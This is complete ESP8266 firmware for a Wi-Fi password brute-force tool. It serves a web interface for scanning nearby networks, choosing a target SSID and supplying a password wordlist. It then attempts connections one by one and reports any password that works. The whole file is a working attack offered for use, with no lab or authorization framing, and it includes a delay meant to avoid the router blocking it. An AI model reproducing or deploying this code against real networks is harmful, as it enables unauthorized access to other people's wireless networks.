#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

ESP8266WebServer server(80);

#define LED_PIN 2          // D4 - NodeMCU blue onboard LED (LOW = ON)

String targetSSID = "";
String passwordList = "";
String currentPassword = "";
String statusMessage = "Ready... Idle";
bool isBruteForcing = false;
int currentAttempt = 0;
bool stopRequested = false;
bool passwordFound = false;

const char* ap_ssid = "ESP-BruteForce";
const char* ap_pass = "12345678";

void handleRoot() {
  String html = R"=====(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>ESP8266 WiFi Brute</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {background:#000; color:#0f0; font-family:'Courier New',monospace; margin:0; padding:15px;}
    h1 {color:#0f0; text-align:center;}
    button {background:#040; color:#0f0; border:1px solid #0f0; padding:10px 18px; margin:8px; cursor:pointer; font-size:15px;}
    button:hover {background:#060;}
    button.stop {background:#400; border-color:#f00;}
    button.stop:hover {background:#600;}
    textarea, select {background:#111; color:#0f0; border:1px solid #0a0; padding:8px; width:95%; max-width:480px; font-family:'Courier New';}
    #status {margin-top:15px; padding:12px; border:1px solid #0f0; min-height:160px; white-space:pre-wrap; font-size:14px; background:#050505;}
    .success {color:#ff0; font-weight:bold;}
  </style>
</head>
<body>
  <h1>ESP8266 WiFi Brute Force</h1>

  <button onclick="scanWiFi()">Scan Networks</button><br><br>

  <label>Target SSID:</label><br>
  <select id="ssidSelect"><option value="">-- Select --</option></select><br><br>

  <label>Wordlist (one password per line):</label><br>
  <textarea id="wordlist" rows="12" placeholder="12345678\npassword\nqwerty\n..."></textarea><br><br>

  <button onclick="startBruteForce()">START Attack</button>
  <button class="stop" onclick="stopBruteForce()">STOP Attack</button><br><br>

  <div id="status">Status: Ready... Idle</div>

  <script>
    function scanWiFi() {
      fetch('/scan').then(r=>r.json()).then(data=>{
        let sel = document.getElementById('ssidSelect');
        sel.innerHTML = '<option value="">-- Select --</option>';
        data.forEach(s=>{let o=document.createElement('option'); o.value=o.text=s; sel.add(o);});
        document.getElementById('status').innerText = 'Scan done. Found: ' + data.length;
      }).catch(e=>{document.getElementById('status').innerText = 'Scan error: ' + e;});
    }

    function startBruteForce() {
      let ssid = document.getElementById('ssidSelect').value;
      let list = document.getElementById('wordlist').value.trim();
      if(!ssid || !list) {alert('SSID + Wordlist দাও!'); return;}
      fetch('/start', {
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'ssid='+encodeURIComponent(ssid)+'&list='+encodeURIComponent(list)
      }).then(r=>r.text()).then(txt=>{document.getElementById('status').innerText = txt;});
    }

    function stopBruteForce() {
      fetch('/stop').then(r=>r.text()).then(txt=>{document.getElementById('status').innerText = txt;});
    }

    setInterval(()=>{
      fetch('/status').then(r=>r.text()).then(txt=>{
        document.getElementById('status').innerText = txt;
      });
    }, 1800);
  </script>
</body>
</html>
)=====";
  server.send(200, "text/html", html);
}

void handleScan() {
  int n = WiFi.scanNetworks();
  if (n == -2) n = WiFi.scanNetworks();  // retry if needed
  String json = "[";
  for (int i = 0; i < n; ++i) {
    if (i > 0) json += ",";
    json += "\"" + WiFi.SSID(i) + "\"";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleStart() {
  if (server.hasArg("ssid") && server.hasArg("list")) {
    targetSSID = server.arg("ssid");
    passwordList = server.arg("list");
    currentPassword = "";
    isBruteForcing = true;
    stopRequested = false;
    passwordFound = false;
    currentAttempt = 0;
    digitalWrite(LED_PIN, HIGH);  // LED off
    statusMessage = "Attack STARTED → " + targetSSID + "\n";
    server.send(200, "text/plain", statusMessage + "Running... (STOP to cancel)");
  } else {
    server.send(400, "text/plain", "Missing SSID or list");
  }
}

void handleStop() {
  if (isBruteForcing) {
    stopRequested = true;
    isBruteForcing = false;
    digitalWrite(LED_PIN, HIGH);
    server.send(200, "text/plain", "Attack STOPPED by user.");
  } else {
    server.send(200, "text/plain", "No attack running.");
  }
}

void handleStatus() {
  String msg = statusMessage;
  if (passwordFound) {
    msg += "\n[SUCCESS] Password found!\nBlue LED should stay ON now.\n";
  } else if (isBruteForcing) {
    msg += "Attempts: " + String(currentAttempt) + "\n";
    if (currentPassword.length() > 0) {
      msg += "Trying → " + currentPassword + "\n";
    }
  } else if (stopRequested) {
    msg += "Manually stopped.\n";
  }
  server.send(200, "text/plain", msg);
}

void setup() {
  Serial.begin(115200);
  delay(300);
  Serial.println("\nESP Brute Force AP starting...");

  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);  // LED off

  WiFi.persistent(false);       // No flash writes → faster & safer
  WiFi.setAutoConnect(false);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_pass);

  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/start", HTTP_POST, handleStart);
  server.on("/stop", handleStop);
  server.on("/status", handleStatus);

  server.begin();
  Serial.println("HTTP server ready");
}

void loop() {
  server.handleClient();

  if (!isBruteForcing || passwordList.length() == 0 || stopRequested || passwordFound) {
    if (!isBruteForcing) digitalWrite(LED_PIN, HIGH);
    return;
  }

  // Get next password
  int nl = passwordList.indexOf('\n');
  String pass;
  if (nl == -1) {
    pass = passwordList;
    passwordList = "";
  } else {
    pass = passwordList.substring(0, nl);
    passwordList = passwordList.substring(nl + 1);
  }
  pass.trim();
  if (pass.length() == 0) return;

  currentAttempt++;
  currentPassword = pass;
  statusMessage = "Target: " + targetSSID + "   Attempt #" + String(currentAttempt) + " → " + pass;

  WiFi.disconnect(true);
  delay(40);                    // short clean-up

  WiFi.begin(targetSSID.c_str(), pass.c_str());

  int timeout = 0;
  const int MAX_WAIT = 10;      // ~2 seconds max wait (150ms * 13 ≈ 2s)

  while (WiFi.status() != WL_CONNECTED && timeout < MAX_WAIT && !stopRequested) {
    delay(150);
    timeout++;
    server.handleClient();
    yield();
  }

  if (stopRequested) {
    WiFi.disconnect(true);
    statusMessage += "   → STOPPED\n";
    digitalWrite(LED_PIN, HIGH);
    isBruteForcing = false;
    return;
  }

  if (WiFi.status() == WL_CONNECTED) {
    statusMessage += "   → SUCCESS! Password: " + pass + "\n";
    statusMessage += "IP: " + WiFi.localIP().toString() + "\n";
    digitalWrite(LED_PIN, LOW);          // Blue LED ON forever (until reset)
    passwordFound = true;
    isBruteForcing = false;
  } else {
    statusMessage += "   → Failed\n";
    WiFi.disconnect(true);
  }

  currentPassword = "";
  delay(80);   // very short breathing to avoid router block
}
